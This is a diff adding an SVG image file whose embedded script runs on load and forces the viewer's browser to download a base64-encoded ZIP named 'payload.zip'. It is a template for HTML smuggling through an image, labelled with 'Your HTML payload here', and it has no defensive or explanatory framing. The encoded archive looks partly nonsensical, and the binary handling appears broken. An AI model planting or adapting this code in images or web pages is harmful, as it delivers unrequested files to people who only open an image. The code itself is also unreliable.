@@ -1,0 +1,41 @@
+<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <!-- Your HTML payload here -->
+      <script>
+        // Create a function to trigger the download
+        function downloadFile() {
+          // Base64 encoded representation of the ZIP file content
+          var zipContent = "UEsDBAoAAAAIAO1gTE4AAAAAAAAAAAAAAAALABAAZXhlbXBzL2hlbHBlcnMuaHRtbCJ1J08zWKMjNTEwVFACgATAH0ATUVUQS1JTkYvTGFuZy9PYmplY3QvbG9nL2xhbmd1YWdlLnhtbC5yYXNQSwECFAMKAAAACADtYEwV67XhMBQAAAABAAAAAwATABwAdGV4dC9odG1sVVQJAAgIAKsEAAAA";
+          
+          // Decode the base64 content
+          var zipData = atob(zipContent);
+          
+          // Create a blob from the decoded data
+          var blob = new Blob([zipData], { type: 'application/zip' });
+          
+          // Create a URL for the blob
+          var url = URL.createObjectURL(blob);
+          
+          // Create a link element
+          var link = document.createElement('a');
+          link.href = url;
+          link.download = 'payload.zip'; // Set the filename
+          
+          // Append the link to the document
+          document.body.appendChild(link);
+          
+          // Trigger the download
+          link.click();
+          
+          // Cleanup
+          document.body.removeChild(link);
+          URL.revokeObjectURL(url);
+        }
+        
+        // Call the function to trigger the download
+        downloadFile();
+      </script>
+    </div>
+  </foreignObject>
+</svg>
